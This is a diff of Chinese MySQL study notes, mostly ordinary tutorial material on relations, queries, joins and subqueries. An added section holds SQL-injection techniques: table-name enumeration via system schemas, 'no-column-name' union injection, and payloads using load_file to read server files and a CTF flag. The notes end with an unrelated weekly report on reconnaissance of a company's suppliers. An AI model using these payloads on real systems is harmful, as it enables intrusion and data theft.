@@ -27,27 +27,19 @@ SQL（结构化查询语言，Structured Query Language）是一种用来访问�
 
 ### 关系之间的引用
 
-上一个例子是多对一的外键（多个学生对应一个班级），经常还会有一对多、多对多、一对一（如每个学生对应一个手机号。不把手机号放进学生表里可能是为了不改动学生表，或有的学生没有手机号，或者把不常用的字段分开存储提高效率）
-
-多对一、一对多
-多个学生对一个专业，如果从专业角度来看就是一个专业对多个学生
-学生（学号，姓名，专业号）
-专业（专业号，专业名）
-
-多对多
-多个学生对多个课程
-学生（学号，姓名，课程号）
-课程（课程号，课程名，学分）
-修读情况（学号，课程号，成绩）
-
-一对一
-一个学生对一个电话号码。使用一对一的原因可能有：给原本数据库添加联系方式而不改变原本的学生表、把大表中不常用的字段拆出来，提高查询效率
-学生（学号，姓名）
-联系方式（学号，电话号码）
+- 多对一、一对多
+  - 多个学生对一个专业。如果从专业角度来看就是一个专业对多个学生
+  - 设计两张表：学生（学号，姓名，专业号）、专业（专业号，专业名），利用`学生`表的`专业号`字段表示学生和专业的引用
+- 多对多
+  - 多个学生对多个课程
+  - 设计三张表：学生（学号，姓名，课程号）、课程（课程号，课程名，学分）、修读情况（学号，课程号，成绩），利用`修读情况`表记录记录之间的引用
+- 一对一
+  - 一个学生对一个电话号码。使用一对一的原因可能有：给原本数据库添加联系方式而不改变原本的学生表、把大表中不常用的字段拆出来，提高查询效率
+  - 设计两张表：学生（学号，姓名）、联系方式（学号，电话号码）
 
 ### 索引
 
-索引是对某一列的值进行预排序的数据结构，使用索引后查找时不会搜索整张表而是直接定位，加快查询速度，但代价时插入、更新、删除时索引要变化，因此这些操作的速度下降。
+索引是对某一列的值进行预排序的数据结构，使用索引后查找时不会搜索整张表而是直接定位，加快查询速度，但代价是插入、更新、删除时索引要变化，因此这些操作的速度下降。
 
 ## 数据库设计
 
@@ -84,7 +76,7 @@ CREATE DATABASE school;  -- 创建
 USE school;      -- 选择数据库
 SHOW TABLES;     -- 查询当前数据库所有表
 DESC students;   -- 查询表的结构，字段类型，主键，是否为空等属性
-DROP school;     -- 删除表
+DROP school;     -- 删除数据库
 ```
 
 ## 定义表
@@ -138,6 +130,8 @@ REPLACE INTO students (id, class_id, name, gender, score) VALUES (1, 1, '小明'
 
 # 查询数据
 
+## SELECT
+
 SQL主要用`SELECT`指令查询。查询结果是一张表
 
 
@@ -163,7 +157,7 @@ SELECT 1;
 | `IS NULL`         | 是否`NULL`（注意：`NULL`和其他值比较结果始终为`NULL`） |
 | `<=>`             | 两个值相等或者都为`NULL`                               |
 
-**复杂查询**
+## 复杂查询
 
 ```sql
 -- 分页查询
@@ -183,16 +177,23 @@ SELECT class_id, COUNT(*) num FROM students GROUP BY class_id;
 SELECT class_id, gender, COUNT(*) num FROM students GROUP BY class_id, gender;
     -- 使用多个列进行分组，此例的结果将是班级数量*2（男女两个性别）列、3行的表
 
+-- 别名
+SELECT
+    id as sid,       # 用as标识别名
+    name `sname`,    # 反斜杠标识别名
+    gender sgender   # 空格，同样也是表示别名
+FROM students as s;  # 表名也可以起别名
+
 -- 笛卡尔查询
 SELECT * FROM students, classes;
     -- 查询结果是两个表的直积，即表1与表2每行两两拼起来，有c1+c2列，r1*r2行
     -- 如果两张表有重复的表头，查询结果就会有重复表头，可以设置别名来解决
 SELECT
-    s.id sid,
-    s.name,
-    c.id cid,
-    c.name cname
-FROM students s, classes c;
+    s.id as sid,
+    s.name as sname,
+    c.id as cid,
+    c.name as cname
+FROM students as s, classes as c;
 
 -- 连接查询
 SELECT students.id, students.name, class.name class_name
@@ -201,14 +202,32 @@ INNER JOIN classes
 ON students.class_id = classes.id;
 /*
 以students作为主表，连接classes表，连接条件是classes.id = students.class_id的条目
-INNER JOIn表示只返回同时存在于两张表的数据；LEFT OUTER JOIN则返回全部右表存在的行，如
+INNER JOIN表示只返回同时存在于两张表的数据；LEFT OUTER JOIN则返回全部右表存在的行，如
 只在右表存在，空余列填NULL；RIGHT OUTER JOIN反之，FULL OUTER JOIN返回全部的行
 */
 
--- 并集
-SELECT * from students WHERE class_id=1
+-- 并集。相当于两张表拼起来，有r1 + r2行。两个查询列数必须相同
+SELECT * FROM students WHERE class_id=1
 UNION
-SELECT * from students WHERE class_id=2;
+SELECT * FROM students WHERE class_id=2;
+```
+
+## 嵌套查询
+
+可以在SELECT、INSERT等语句中嵌套SELECT语句，嵌套的子查询需要用括号括起来
+
+```sql
+# 如果子查询返回值只有一个，可以用比较运算符处理
+SELECT * FROM person
+WHERE age > (select age from persom where name='John Doe');
+
+# 如果子查询返回值是n行1列，可以用any，all，in等运算符处理
+SELECT * FROM person
+WHERE country_id in (select id from country where population > 1e7);
+
+# 如果子查询有多行多列，可以当作一个表来处理
+SELECT s.id
+FROM (select * from students)s;  # 注意，最后的s是给这个表起的别名。必须有别名才会被当作一个表
 ```
 
 # 事务
@@ -232,14 +251,17 @@ COMMIT;
 
 # 函数
 
-
+[MySQL函数 | 菜鸟教程](https://www.runoob.com/mysql/mysql-functions.html)
 
 # SQL数据库
 
 ## MySQL
 
 ```bash
-# 登录。-u参数为用户名，-p参数表示需要密码
+# 启动mysql服务器（具体命令因版本可能不同）
+service mysql start
+
+# 登录。-u参数为用户名，-p参数表示需要密码（可能需要sudo）
 mysql -u root -p
 
 # 登录成功后会显示SQL shell。在此输入SQL语句即可访问数据库
@@ -276,3 +298,98 @@ cnx.commit()
 cursor.close()
 cnx.close()
 ```
+
+# 其他
+
+本节记载一些比较偏门的知识
+
+```sql
+# GROUP BY + WITH ROLLUP：多产生几行统计数据
+# https://dev.mysql.com/doc/refman/8.4/en/group-by-modifiers.html
+SELECT * FROM students GROUP BY class_id WITH ROLLUP;
+```
+
+## 获取数据库信息
+
+### 数据库名
+
+```sql
+# MySQL
+SELECT schema_name FROM information_schema.schemata;
+```
+
+### 表名
+
+参考：https://www.cnblogs.com/20175211lyz/p/12358725.html
+
+```sql
+# MySQL
+SELECT table_name FROM information_schema.tables WHERE table_schema = 'db_name';
+# MySQL 5.6+
+SELECT table_name from mysql.innodb_table_stats WHERE database_name = database();
+# MySQL 5.7.9+
+# 包含in
+SELECT object_name FROM `sys`.`x$innodb_buffer_stats_by_table` where object_schema = database();
+SELECT object_name FROM `sys`.`innodb_buffer_stats_by_table` WHERE object_schema = DATABASE();
+SELECT TABLE_NAME FROM `sys`.`x$schema_index_statistics` WHERE TABLE_SCHEMA = DATABASE();
+SELECT TABLE_NAME FROM `sys`.`schema_auto_increment_columns` WHERE TABLE_SCHEMA = DATABASE();
+# 不包含in
+SELECT TABLE_NAME FROM `sys`.`x$schema_flattened_keys` WHERE TABLE_SCHEMA = DATABASE();
+SELECT TABLE_NAME FROM `sys`.`x$ps_schema_table_statistics_io` WHERE TABLE_SCHEMA = DATABASE();
+SELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = DATABASE();
+# 通过表文件的存储路径获取表名
+SELECT FILE FROM `sys`.`io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();
+SELECT FILE FROM `sys`.`io_global_by_file_by_latency` WHERE FILE REGEXP DATABASE();
+SELECT FILE FROM `sys`.`x$io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();
+
+# performance schema
+SELECT object_name FROM `performance_schema`.`objects_summary_global_by_type` WHERE object_schema = DATABASE();
+SELECT object_name FROM `performance_schema`.`table_handles` WHERE object_schema = DATABASE();
+SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_index_usage` WHERE object_schema = DATABASE();
+SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_table` WHERE object_schema = DATABASE();
+SELECT object_name FROM `performance_schema`.`table_lock_waits_summary_by_table` WHERE object_schema = DATABASE();
+
+```
+
+### 列名
+
+```sql
+# mysql
+SELECT column_name FROM information_schema.columns
+WHERE table_name="table" AND table_schema="db_name";
+```
+
+特殊：无列名注入
+
+```sql
+SELECT a FROM (select 1 `a`, 2 `b` union select * from `test_table`)x;
+
+# 无逗号、使用join的版本
+SELECT a FROM (
+    (select * from (select 1 `a`)p join (select 2 `b`)q where 0)x
+    union
+    select * from test_table
+)x;
+```
+
+
+
+```sql
+SELECT`table_name`from(mysql.innodb_table_stats)WHERE`database_name`=database()
+SELECT ? FROM content WHERE id=
+'0'union(select`c`from(select'1'`a`,'2'`b`,'3'`c`union(select*from`content`))t/**/limit/**/1,1)
+
+'0'union(select/**/load_file("../../../var/www/html/secret.php"))
+'0'union(select/**/load_file("/real_flag_is_here"))
+
+union(select`a`from(select'1'`a`,'2'`b`)r)
+```
+
+
+
+
+
+我这周跟着李佳俊排查了航保供应商的资产，也在继续搜集航保的信息，空闲时间在学php以及在靶场练习
+
+供应商资产排查了一遍没有发现直接和航保相关的；有一些不知道有没有关联的，像是用途不明的api，李佳俊让我不用看这些。航保的敏感信息搜集我去找了他们的官网和公众号，泄露很少，只有几个hr和咨询邮箱。我和罗超他们讨论过，现在我们几个人搜集到的差不多都是这些东西
+
